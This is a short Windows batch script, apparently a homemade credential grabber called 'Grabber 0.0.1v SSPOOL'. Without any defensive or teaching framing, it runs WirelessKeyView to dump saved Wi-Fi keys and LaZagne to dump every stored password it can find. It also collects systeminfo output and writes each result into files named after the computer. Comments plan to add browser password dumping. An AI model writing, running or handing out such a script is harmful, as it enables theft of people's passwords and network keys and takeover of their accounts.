@echo off
REM Grabber 0.0.1v SSPOOL
REM Not Copyrighted but dont steal my simple ass code <3
REM TODO: Get fuckin' PasswordFox  and ChromePass to Output into a text file.
cd Tools
REM GOTO THE TOOLS DIR

:call
REM Calls all programs to dig :)

WirelessKeyView.exe /stext "/%COMPUTERNAME%_wifi.txt"
lazagne.exe all >> "/%COMPUTERNAME%_pass.txt"
systeminfo >> "/%COMPUTERNAME%.txt"
